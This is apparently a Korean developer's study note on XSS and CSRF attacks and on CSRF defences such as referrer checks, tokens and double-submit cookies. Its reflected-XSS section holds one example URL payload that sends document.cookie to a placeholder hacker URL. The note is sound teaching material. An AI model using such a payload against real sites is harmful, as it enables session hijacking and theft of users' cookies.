# 04. XSS, CSRF Attack

## XSS Attack

XSS는 Cross-Site Scripting의 줄임말로 웹 사이트에 스크립트를 삽입하여 공격하는 방식입니다.

스크립트를 삽입하기 위해서 사용자가 글을 쓰고 읽을 수 있는 게시판 등에 많이 사용하며 이를 통해 다른 사용자의 쿠키를 탈취하여 세션ID를 사용하여 로그인할 수 도 있습니다.



### Persistent XSS

Persistent의 의미대로 지속적으로 피해를 입히는 XSS 공격 방식입니다.

예를 들어 해커의 악성 스크립트가 담긴 게시글이 DB에 저장되고, 다른 사용자들은 그 게시글을 읽을 때마다 지속적으로 공격을 받게 됩니다.



### Reflected XSS

사용자에게 입력받은 값을 서버에서 그대로 응답하는 경우 사용하는 XSS 공격 방식입니다.

예를 들어 해커가 URL 안에 악의적인 스크립트를 함께 첨부하여 해당 URL을 눌렀을 때 공격을 받게 됩니다.

``` 
http://mysite.com?search=<script>location.href("{해커의 URL}?value="+document.cookie);</script>
```



## CSRF Attack

CSRF는 Cross Site Request Forgery의 줄임말로 사용자가 자신의 의도와 다른 행위를 요청하도록 하는 공격입니다.

여기서 말하는 자신의 의도와 다른 행위란 생성, 수정, 삭제 등을 말합니다.

예를 들어 자신의 개인 SNS 계정에 특정 광고를 기재 할 수 있는 것이죠.

사용자가 SNS에 로그인한 상태에서 해커가 의도한 페이지를 열게 되면 해당 페이지의 스크립트가 SNS에 글을 쓰게 하는 요청을 날리고, SNS는 로그인한 사용자이기 때문에 해당 요청을 문제없이 받아들이게 됩니다.



CSRF 공격을 방지하는 방법에 대해 알아봅시다.

### Referrer 검증

서버에서 request의 referrer을 확인하여 domain이 일치하는 지 검증하는 방법입니다.

하지만 같은 domain 내 페이지에 XSS 취약점이 있을 경우에는 referrer을 확인해도 CSRF 공격에 취약해질 수 밖에 없습니다.

> HTTP Referrer란
>
> 각각의 사이트에 방문 시 남는 흔적을 말합니다.
>
> A사이트에서 B사이트로 이동하는 하이퍼링크를 통해 이동할 때 B사이트에서 해당 유저가 A사이트를 통해 자신의 사이트에 방문한 사실을 알 수 있게 해줍니다.





### CSRF Token

CSRF 공격을 방지하기 위해 token을 사용하는 방법입니다.

사용자의 세션에 임의의 난수로 만들어진 token을 저장하고 사용자의 요청마다 해당 난수 값을 포함시켜 전송합니다.

 서버에서는 세션의 token과 사용자 요청의 token을 비교하여 공격을 방어합니다.





### Double Submit Cookie 검증

웹의 Same Origin 정책으로 인해 프론트에서 다른 domain의 쿠키 값에 접근할 수 없다는 점을 이용한 방법입니다.

요청을 보낼 때 임의의 난수로 만들어진 token을 쿠키에도 저장하고 파라미터로도 넘겨서 서버에서 두 값이 일치하는지 검사합니다.

> 주로 사용하는 프레임워크 Django가 이 방법을 사용합니다.
>
> 이 방법을 알기 전 까지는 위에서 언급한 `CSRF Token` 방법인지 알고 도대체 서버에서 언제 어디서 저장하는지 코드를 다 까봤던 기억이 있네요.





## 레퍼런스

https://noirstar.tistory.com/266

https://itstory.tk/entry/CSRF-%EA%B3%B5%EA%B2%A9%EC%9D%B4%EB%9E%80-%EA%B7%B8%EB%A6%AC%EA%B3%A0-CSRF-%EB%B0%A9%EC%96%B4-



## 질문할 사항



## 추가 공부할 키워드

* 다른 공격 방법들도 있을까